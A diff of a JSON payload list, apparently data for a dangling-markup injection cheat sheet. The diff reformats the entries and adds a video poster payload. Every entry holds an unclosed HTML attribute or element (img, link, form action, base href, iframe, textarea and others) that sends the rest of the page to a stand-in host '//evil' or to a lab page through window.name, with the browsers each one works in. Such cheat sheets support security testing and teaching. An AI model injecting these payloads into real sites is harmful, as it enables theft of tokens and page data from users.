@@ -1,249 +1,132 @@
 [
-    {
-        "description": "Background attribute",
-        "code": "<body background=\"\/\/evil?\n<table background=\"\/\/evil?\n<table><thead background=\"\/\/evil?\n<table><tbody background=\"\/\/evil?\n<table><tfoot background=\"\/\/evil?\n<table><td background=\"\/\/evil?\n<table><th background=\"\/\/evil?",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Link href stylesheet",
-        "code": "<link rel=stylesheet href=\"\/\/evil?",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Link href icon",
-        "code": "<link rel=icon href=\"\/\/evil?",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Meta refresh",
-        "code": "<meta http-equiv=\"refresh\" content=\"0; http:\/\/evil?",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Img to pass markup through src attribute",
-        "code": "<img src=\"\/\/evil?\n<image src=\"\/\/evil?",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Video using track element",
-        "code": "<video><track default src=\"\/\/evil?",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Video using source element and src attribute",
-        "code": "<video><source src=\"\/\/evil?",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Audio using source element and src attribute",
-        "code": "<audio><source src=\"\/\/evil?",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Input src",
-        "code": "<input type=image src=\"\/\/evil?",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Button using formaction",
-        "code": "<form><button style=\"width:100%;height:100%\" type=submit formaction=\"\/\/evil?",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Input using formaction",
-        "code": "<form><input type=submit value=\"XSS\" style=\"width:100%;height:100%\" type=submit formaction=\"\/\/evil?",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Form using action",
-        "code": "<button form=x style=\"width:100%;height:100%;\"><form id=x action=\"\/\/evil?",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Object data",
-        "code": "<object data=\"\/\/evil?",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Iframe src",
-        "code": "<iframe src=\"\/\/evil?",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Embed src",
-        "code": "<embed src=\"\/\/evil?",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Use textarea to consume markup and post to external site",
-        "code": "<form><button formaction=\/\/evil>XSS<\/button><textarea name=x>",
-        "browsers": [
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Pass markup data through window.name using form target",
-        "code": "<button form=x>XSS<\/button><form id=x action=\/\/evil target='",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Pass markup data through window.name using base target",
-        "code": "<a href=http:\/\/subdomain1.portswigger-labs.net\/dangling_markup\/name.html><font size=100 color=red>You must click me<\/font><\/a><base target=\"",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Pass markup data through window.name using formtarget",
-        "code": "<form><input type=submit value=\"Click me\" formaction=http:\/\/subdomain1.portswigger-labs.net\/dangling_markup\/name.html formtarget=\"",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Using base href to pass data",
-        "code": "<a href=abc style=\"width:100%;height:100%;position:absolute;font-size:1000px;\">xss<base href=\"\/\/evil\/",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Using embed window name to pass data from the page",
-        "code": "<embed src=http:\/\/subdomain1.portswigger-labs.net\/dangling_markup\/name.html name=\"",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Using iframe window name to pass data from the page",
-        "code": "<iframe src=http:\/\/subdomain1.portswigger-labs.net\/dangling_markup\/name.html name=\"",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Using object window name to pass data from the page",
-        "code": "<object data=http:\/\/subdomain1.portswigger-labs.net\/dangling_markup\/name.html name=\"",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Using frame window name to pass data from the page",
-        "code": "<frameset><frame src=http:\/\/subdomain1.portswigger-labs.net\/dangling_markup\/name.html name=\"",
-        "browsers": [
-            "chrome",
-            "firefox",
-            "edge",
-            "safari"
-        ]
-    },
-    {
-        "description": "Overwrite type attribute with image in hidden inputs",
-        "code": "<input type=hidden type=image src=\"//evil?",
-        "browsers": [
-            "chrome",
-            "safari"
-        ]
-    }
+  {
+    "description": "Background attribute",
+    "code": "<body background=\"//evil?\n<table background=\"//evil?\n<table><thead background=\"//evil?\n<table><tbody background=\"//evil?\n<table><tfoot background=\"//evil?\n<table><td background=\"//evil?\n<table><th background=\"//evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Link href stylesheet",
+    "code": "<link rel=stylesheet href=\"//evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Link href icon",
+    "code": "<link rel=icon href=\"//evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Meta refresh",
+    "code": "<meta http-equiv=\"refresh\" content=\"0; http://evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Img to pass markup through src attribute",
+    "code": "<img src=\"//evil?\n<image src=\"//evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Video using track element",
+    "code": "<video><track default src=\"//evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Video using source element and src attribute",
+    "code": "<video><source src=\"//evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Audio using source element and src attribute",
+    "code": "<audio><source src=\"//evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Input src",
+    "code": "<input type=image src=\"//evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Button using formaction",
+    "code": "<form><button style=\"width:100%;height:100%\" type=submit formaction=\"//evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Input using formaction",
+    "code": "<form><input type=submit value=\"XSS\" style=\"width:100%;height:100%\" type=submit formaction=\"//evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Form using action",
+    "code": "<button form=x style=\"width:100%;height:100%;\"><form id=x action=\"//evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Object data",
+    "code": "<object data=\"//evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Iframe src",
+    "code": "<iframe src=\"//evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Embed src",
+    "code": "<embed src=\"//evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Use textarea to consume markup and post to external site",
+    "code": "<form><button formaction=//evil>XSS</button><textarea name=x>",
+    "browsers": ["firefox", "edge", "safari"]
+  },
+  {
+    "description": "Pass markup data through window.name using form target",
+    "code": "<button form=x>XSS</button><form id=x action=//evil target='",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Pass markup data through window.name using base target",
+    "code": "<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target=\"",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Pass markup data through window.name using formtarget",
+    "code": "<form><input type=submit value=\"Click me\" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget=\"",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Using base href to pass data",
+    "code": "<a href=abc style=\"width:100%;height:100%;position:absolute;font-size:1000px;\">xss<base href=\"//evil/",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Using embed window name to pass data from the page",
+    "code": "<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Using iframe window name to pass data from the page",
+    "code": "<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Using object window name to pass data from the page",
+    "code": "<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Using frame window name to pass data from the page",
+    "code": "<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=\"",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  },
+  {
+    "description": "Overwrite type attribute with image in hidden inputs",
+    "code": "<input type=hidden type=image src=\"//evil?",
+    "browsers": ["chrome", "safari"]
+  },
+  {
+    "description": "Video element with poster attribute",
+    "code": "<video poster=//evil?",
+    "browsers": ["chrome", "firefox", "edge", "safari"]
+  }
 ]
